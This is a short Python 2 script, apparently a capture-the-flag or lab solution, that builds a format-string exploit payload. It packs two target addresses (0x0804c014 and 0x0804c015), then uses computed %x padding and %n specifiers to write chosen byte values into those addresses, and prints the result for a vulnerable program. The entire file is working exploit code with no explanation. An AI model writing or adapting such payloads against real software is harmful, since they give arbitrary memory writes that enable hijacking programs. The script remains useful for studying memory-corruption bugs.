#!/usr/bin/python

w1 = '\x14\xc0\x04\x08JUNK'
w2 = '\x15\xc0\x04\x08JUNK'

b1 = 0xaa
b2 = 0xbb

n1 =  b1 - 0x14 - 0x0C
n2 =  b2 - n1 - 0x20

form = '%x%x%' + str(n1) + 'x%n' + '%' + str(n2) + 'x%n'

#form = '%x%x%x%n%x%n'

print w1 + w2 + form
